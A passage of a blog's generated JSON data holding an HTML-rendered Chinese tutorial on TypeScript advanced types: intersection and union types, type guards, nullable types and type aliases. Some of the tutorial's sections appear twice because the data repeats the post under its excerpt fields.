class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isNumber</span>(<span class=\"params\">x: <span class=\"built_in\">any</span></span>): <span class=\"title\">x</span> <span class=\"title\">is</span> <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> x === <span class=\"string\">\"number\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isString</span>(<span class=\"params\">x: <span class=\"built_in\">any</span></span>): <span class=\"title\">x</span> <span class=\"title\">is</span> <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> x === <span class=\"string\">\"string\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">padLeft</span>(<span class=\"params\">value: <span class=\"built_in\">string</span>, padding: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isNumber(padding)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(padding + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>) + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isString(padding)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> padding + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">`Expected string or number, got '<span class=\"subst\">$&#123;padding&#125;</span>'.`</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们不必将 <code>typeof x === &quot;number&quot;</code> 抽象成一个函数，因为TypeScript可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了。</p>\n<p>重写上面的代码：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">padLeft</span>(<span class=\"params\">value: <span class=\"built_in\">string</span>, padding: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> padding === <span class=\"string\">\"number\"</span>) &#123; <span class=\"comment\">// 直接使用 typeof 判断</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(padding + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>) + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> padding === <span class=\"string\">\"string\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> padding + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">`Expected string or number, got '<span class=\"subst\">$&#123;padding&#125;</span>'.`</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这些 <code>typeof类型保护</code> 只有两种形式能被识别： <code>typeof v === &quot;typename&quot;</code> 和 <code>typeof v !== &quot;typename&quot;</code>， <code>&quot;typename&quot;</code> 必须是 <code>&quot;number&quot;</code>， <code>&quot;string&quot;</code>， <code>&quot;boolean&quot;</code> 或 <code>&quot;symbol&quot;</code>。</p>\n<h4 id=\"instanceof-类型保护\"><a href=\"#instanceof-类型保护\" class=\"headerlink\" title=\"instanceof 类型保护\"></a>instanceof 类型保护</h4><p>与 <code>javascript</code> 中的类似，<code>instanceof</code> 类型保护是通过构造函数来细化类型的一种方式。<br>这里直接使用官方例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Padder &#123;</span><br><span class=\"line\">    getPaddingString(): <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> SpaceRepeatingPadder <span class=\"keyword\">implements</span> Padder &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> numSpaces: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">    getPaddingString() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(<span class=\"keyword\">this</span>.numSpaces + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> StringPadder <span class=\"keyword\">implements</span> Padder &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> value: <span class=\"built_in\">string</span></span>) &#123; &#125;</span><br><span class=\"line\">    getPaddingString() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getRandomPadder</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.random() &lt; <span class=\"number\">0.5</span> ?</span><br><span class=\"line\">        <span class=\"keyword\">new</span> SpaceRepeatingPadder(<span class=\"number\">4</span>) :</span><br><span class=\"line\">        <span class=\"keyword\">new</span> StringPadder(<span class=\"string\">\"  \"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类型为SpaceRepeatingPadder | StringPadder</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> padder: Padder = getRandomPadder();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (padder <span class=\"keyword\">instanceof</span> SpaceRepeatingPadder) &#123;</span><br><span class=\"line\">    padder; <span class=\"comment\">// 类型细化为'SpaceRepeatingPadder'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (padder <span class=\"keyword\">instanceof</span> StringPadder) &#123;</span><br><span class=\"line\">    padder; <span class=\"comment\">// 类型细化为'StringPadder'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"可以为-null-的类型\"><a href=\"#可以为-null-的类型\" class=\"headerlink\" title=\"可以为 null 的类型\"></a>可以为 null 的类型</h3><p><code>TypeScript</code> 具有两种特殊的类型， <code>null</code> 和 <code>undefined</code>，它们分别具有值<strong>null</strong>和<strong>undefined</strong>。<br>默认情况下，类型检查器认为 <code>null</code> 与 <code>undefined</code> 可以赋值给任何类型。 <code>null</code> 与 <code>undefined</code> 是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。</p>\n<h4 id=\"可选参数与可选属性\"><a href=\"#可选参数与可选属性\" class=\"headerlink\" title=\"可选参数与可选属性\"></a>可选参数与可选属性</h4><p>使用了 <code>--strictNullChecks</code>，<code>可选参数</code>会被自动地加上 <code>| undefined</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, y?: <span class=\"built_in\">number</span></span>) </span>&#123; <span class=\"comment\">// -&gt; (x: number, y?: number | undefined)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + (y || <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">f(<span class=\"number\">1</span>);</span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"literal\">undefined</span>); <span class=\"comment\">// 注意，是可选参数，不是参数</span></span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"literal\">null</span>); <span class=\"comment\">// error, null !== undefined</span></span><br></pre></td></tr></table></figure>\n<p>同理，<code>可选属性</code> 中也是同样的结果：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    b?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c.a = <span class=\"number\">12</span>;</span><br><span class=\"line\">c.b = <span class=\"number\">13</span>;</span><br><span class=\"line\">c.b = <span class=\"literal\">undefined</span>; <span class=\"comment\">// ok</span></span><br><span class=\"line\">c.b = <span class=\"literal\">null</span>; <span class=\"comment\">// error, null !== undefined</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"类型保护和类型断言\"><a href=\"#类型保护和类型断言\" class=\"headerlink\" title=\"类型保护和类型断言\"></a>类型保护和类型断言</h4><p>由于可以为null的类型是通过联合类型实现，那么你需要使用类型保护来去除 <code>null</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">sn: <span class=\"built_in\">string</span> | <span class=\"literal\">null</span></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sn || <span class=\"string\">\"default\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果编译器不能够去除 <code>null</code> 或 <code>undefined</code>，你可以使用 <code>类型断言</code> 手动去除。 语法是添加 <code>!</code> 后缀:<br>例如：<br><code>identifier!</code> 表示从 <code>identifier</code> 的类型里去除了 <code>null</code> 和 <code>undefined</code>。</p>\n<h3 id=\"类型别名\"><a href=\"#类型别名\" class=\"headerlink\" title=\"类型别名\"></a>类型别名</h3><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。<br><strong>起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型</strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Name = <span class=\"built_in\">string</span>; <span class=\"comment\">// string 重命名为 Name</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> NameResolver = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">string</span>; <span class=\"comment\">// 同上..</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> NameOrResolver = Name | NameResolver;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\">n: NameOrResolver</span>): <span class=\"title\">Name</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> n === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> n();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"类型别名-type-vs-接口-interface\"><a href=\"#类型别名-type-vs-接口-interface\" class=\"headerlink\" title=\"类型别名(type) vs 接口(interface)\"></a>类型别名(type) vs 接口(interface)</h4><ol>\n<li>接口创建了一个新的名字，可以在其它任何地方使，类型别名并不创建新名字。</li>\n<li>类型别名不能被 <code>extends</code> 和 <code>implements</code>(自己也不能 <code>extends</code> 和 <code>implements</code> 其它类型)。</li>\n<li>如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br>","more":"</p>\n<h3 id=\"高级类型\"><a href=\"#高级类型\" class=\"headerlink\" title=\"高级类型\"></a>高级类型</h3><h4 id=\"交叉类型-Intersection-Types\"><a href=\"#交叉类型-Intersection-Types\" class=\"headerlink\" title=\"交叉类型(Intersection Types)\"></a>交叉类型(Intersection Types)</h4><p>交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。<br>我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。<br>简单的说：将多个类型进行并集操作，目标类型必须满足合并之后的所有类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加类型 T、U，指定返回值类型必须符合 T 且符合 U</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">extend</span>&lt;<span class=\"title\">T</span>, <span class=\"title\">U</span>&gt;(<span class=\"params\">first: T, second: U</span>): <span class=\"title\">T</span> &amp; <span class=\"title\">U</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = &lt;T &amp; U&gt;&#123;&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> id <span class=\"keyword\">in</span> first) &#123;</span><br><span class=\"line\">        (&lt;<span class=\"built_in\">any</span>&gt;result)[id] = (&lt;<span class=\"built_in\">any</span>&gt;first)[id];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> id <span class=\"keyword\">in</span> second) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!result.hasOwnProperty(id)) &#123;</span><br><span class=\"line\">            (&lt;<span class=\"built_in\">any</span>&gt;result)[id] = (&lt;<span class=\"built_in\">any</span>&gt;second)[id];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Person &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">public</span> name: <span class=\"built_in\">string</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Loggable &#123;</span><br><span class=\"line\">    log(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> ConsoleLogger <span class=\"keyword\">implements</span> Loggable &#123;</span><br><span class=\"line\">    log() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 混合 Person 类和 ConsoleLogger 类</span></span><br><span class=\"line\"><span class=\"comment\">// 生成的 jim 包含两个父类的所有属性和方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> jim = extend(<span class=\"keyword\">new</span> Person(<span class=\"string\">\"Jim\"</span>), <span class=\"keyword\">new</span> ConsoleLogger());</span><br><span class=\"line\"><span class=\"keyword\">var</span> n = jim.name;</span><br><span class=\"line\">jim.log();</span><br></pre></td></tr></table></figure>\n<h4 id=\"联合类型-Union-Types\"><a href=\"#联合类型-Union-Types\" class=\"headerlink\" title=\"联合类型(Union Types)\"></a>联合类型(Union Types)</h4><p>如果把 <code>交叉类型</code> 用 <code>&amp;</code> 符号标示，那么 <code>联合类型</code> 就是 <code>|</code>;<br>如果一个值是联合类型，<strong>我们只能访问此联合类型的所有类型里<code>共有的成员</code></strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Bird &#123;</span><br><span class=\"line\">    fly();</span><br><span class=\"line\">    layEggs();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Fish &#123;</span><br><span class=\"line\">    swim();</span><br><span class=\"line\">    layEggs();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getSmallPet</span>(<span class=\"params\"></span>): <span class=\"title\">Fish</span> | <span class=\"title\">Bird</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> pet = getSmallPet();</span><br><span class=\"line\">pet.layEggs(); <span class=\"comment\">// -&gt; success，Bird U Fish 求交集，共有成员为 layEggs</span></span><br><span class=\"line\">pet.swim();    <span class=\"comment\">// -&gt; error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"类型保护与区分类型-Type-Guards-and-Differentiating-Types\"><a href=\"#类型保护与区分类型-Type-Guards-and-Differentiating-Types\" class=\"headerlink\" title=\"类型保护与区分类型(Type Guards and Differentiating Types)\"></a>类型保护与区分类型(Type Guards and Differentiating Types)</h4><h4 id=\"用户自定义的类型保护\"><a href=\"#用户自定义的类型保护\" class=\"headerlink\" title=\"用户自定义的类型保护\"></a>用户自定义的类型保护</h4><p>类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。 要定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个 <code>类型谓词</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isFish</span>(<span class=\"params\">pet: Fish | Bird</span>): <span class=\"title\">pet</span> <span class=\"title\">is</span> <span class=\"title\">Fish</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (&lt;Fish&gt;pet).swim !== <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// (&lt;Fish&gt;pet)  在这里表示强制类型转换</span></span><br></pre></td></tr></table></figure>\n<p>上述，<code>pet is Fish</code> 就是类型谓词。 谓词为 <code>parameterName is Type</code> 这种形式，<code>parameterName</code> 必须是来自于当前函数签名里的一个参数名。</p>\n<h4 id=\"typeof-类型保护\"><a href=\"#typeof-类型保护\" class=\"headerlink\" title=\"typeof 类型保护\"></a>typeof 类型保护</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isNumber</span>(<span class=\"params\">x: <span class=\"built_in\">any</span></span>): <span class=\"title\">x</span> <span class=\"title\">is</span> <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> x === <span class=\"string\">\"number\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isString</span>(<span class=\"params\">x: <span class=\"built_in\">any</span></span>): <span class=\"title\">x</span> <span class=\"title\">is</span> <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> x === <span class=\"string\">\"string\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">padLeft</span>(<span class=\"params\">value: <span class=\"built_in\">string</span>, padding: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isNumber(padding)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(padding + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>) + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isString(padding)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> padding + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">`Expected string or number, got '<span class=\"subst\">$&#123;padding&#125;</span>'.`</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们不必将 <code>typeof x === &quot;number&quot;</code> 抽象成一个函数，因为TypeScript可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了。</p>\n<p>重写上面的代码：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">padLeft</span>(<span class=\"params\">value: <span class=\"built_in\">string</span>, padding: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> padding === <span class=\"string\">\"number\"</span>) &#123; <span class=\"comment\">// 直接使用 typeof 判断</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(padding + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>) + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> padding === <span class=\"string\">\"string\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> padding + value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">`Expected string or number, got '<span class=\"subst\">$&#123;padding&#125;</span>'.`</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这些 <code>typeof类型保护</code> 只有两种形式能被识别： <code>typeof v === &quot;typename&quot;</code> 和 <code>typeof v !== &quot;typename&quot;</code>， <code>&quot;typename&quot;</code> 必须是 <code>&quot;number&quot;</code>， <code>&quot;string&quot;</code>， <code>&quot;boolean&quot;</code> 或 <code>&quot;symbol&quot;</code>。</p>\n<h4 id=\"instanceof-类型保护\"><a href=\"#instanceof-类型保护\" class=\"headerlink\" title=\"instanceof 类型保护\"></a>instanceof 类型保护</h4><p>与 <code>javascript</code> 中的类似，<code>instanceof</code> 类型保护是通过构造函数来细化类型的一种方式。<br>这里直接使用官方例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Padder &#123;</span><br><span class=\"line\">    getPaddingString(): <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> SpaceRepeatingPadder <span class=\"keyword\">implements</span> Padder &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> numSpaces: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">    getPaddingString() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(<span class=\"keyword\">this</span>.numSpaces + <span class=\"number\">1</span>).join(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> StringPadder <span class=\"keyword\">implements</span> Padder &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span 